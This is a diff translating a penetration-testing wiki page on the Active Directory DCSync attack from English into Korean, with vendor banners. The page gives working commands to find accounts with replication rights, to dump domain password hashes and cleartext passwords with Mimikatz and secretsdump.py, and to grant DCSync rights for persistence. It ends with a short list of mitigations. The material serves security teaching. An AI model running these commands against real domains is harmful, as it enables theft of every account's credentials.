@@ -3,8 +3,8 @@
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync)를 사용하여 세계에서 **가장 진보된** 커뮤니티 도구로 구동되는 **워크플로우**를 쉽게 구축하고 **자동화**하세요.\
+오늘 바로 접근하세요:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
 
@@ -12,69 +12,59 @@ Get Access Today:
 
 ## DCSync
 
-The **DCSync** permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** and **Replicating Directory Changes In Filtered Set**.
+**DCSync** 권한은 도메인 자체에 대해 다음 권한을 갖는 것을 의미합니다: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** 및 **Replicating Directory Changes In Filtered Set**.
 
-**Important Notes about DCSync:**
+**DCSync에 대한 중요 사항:**
 
-- The **DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information** using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.
-- By default only **Domain Admins, Enterprise Admins, Administrators, and Domain Controllers** groups have the required privileges.
-- If any account passwords are stored with reversible encryption, an option is available in Mimikatz to return the password in clear text
+- **DCSync 공격은 도메인 컨트롤러의 동작을 시뮬레이션하고 다른 도메인 컨트롤러에 정보를 복제하도록 요청합니다**. 이는 디렉터리 복제 서비스 원격 프로토콜(MS-DRSR)을 사용합니다. MS-DRSR은 Active Directory의 유효하고 필요한 기능이므로 끄거나 비활성화할 수 없습니다.
+- 기본적으로 **도메인 관리자, 엔터프라이즈 관리자, 관리자 및 도메인 컨트롤러** 그룹만이 필요한 권한을 가지고 있습니다.
+- reversible encryption으로 저장된 계정 비밀번호가 있는 경우, Mimikatz에서 비밀번호를 평문으로 반환하는 옵션이 제공됩니다.
 
 ### Enumeration
 
-Check who has these permissions using `powerview`:
-
+`powerview`를 사용하여 이러한 권한을 가진 사용자를 확인하세요:
 ```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
-
-### Exploit Locally
-
+### 로컬에서 악용하기
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
-
-### Exploit Remotely
-
+### 원격으로 악용하기
 ```powershell
 secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 [-just-dc-user <USERNAME>] #To get only of that user
 [-pwd-last-set] #To see when each account's password was last changed
 [-history] #To dump password history, may be helpful for offline password cracking
 ```
+`-just-dc`는 3개의 파일을 생성합니다:
 
-`-just-dc` generates 3 files:
+- 하나는 **NTLM 해시**
+- 하나는 **Kerberos 키**
+- 하나는 NTDS에서 [**가역 암호화**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)가 활성화된 모든 계정의 평문 비밀번호입니다. 가역 암호화가 활성화된 사용자를 얻으려면 다음을 사용하세요.
 
-- one with the **NTLM hashes**
-- one with the the **Kerberos keys**
-- one with cleartext passwords from the NTDS for any accounts set with [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled. You can get users with reversible encryption with
+```powershell
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+```
 
-  ```powershell
-  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
-  ```
+### 지속성
 
-### Persistence
-
-If you are a domain admin, you can grant this permissions to any user with the help of `powerview`:
-
+도메인 관리자라면 `powerview`의 도움으로 이 권한을 모든 사용자에게 부여할 수 있습니다:
 ```powershell
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
-
-Then, you can **check if the user was correctly assigned** the 3 privileges looking for them in the output of (you should be able to see the names of the privileges inside the "ObjectType" field):
-
+그런 다음, (당신은 "ObjectType" 필드 안에서 권한의 이름을 볼 수 있어야 함) 출력에서 3개의 권한이 **사용자에게 올바르게 할당되었는지 확인**할 수 있습니다:
 ```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
+### 완화
 
-### Mitigation
+- 보안 이벤트 ID 4662 (객체에 대한 감사 정책이 활성화되어야 함) – 객체에 대한 작업이 수행되었습니다.
+- 보안 이벤트 ID 5136 (객체에 대한 감사 정책이 활성화되어야 함) – 디렉터리 서비스 객체가 수정되었습니다.
+- 보안 이벤트 ID 4670 (객체에 대한 감사 정책이 활성화되어야 함) – 객체의 권한이 변경되었습니다.
+- AD ACL 스캐너 - ACL의 생성 및 비교 보고서를 생성합니다. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
 
-- Security Event ID 4662 (Audit Policy for object must be enabled) – An operation was performed on an object
-- Security Event ID 5136 (Audit Policy for object must be enabled) – A directory service object was modified
-- Security Event ID 4670 (Audit Policy for object must be enabled) – Permissions on an object were changed
-- AD ACL Scanner - Create and compare create reports of ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
-
-## References
+## 참조
 
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
 - [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
@@ -84,8 +74,7 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync)를 사용하여 세계에서 **가장 진보된** 커뮤니티 도구로 구동되는 **워크플로우**를 쉽게 구축하고 **자동화**하세요.\
+오늘 바로 액세스하세요:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
-
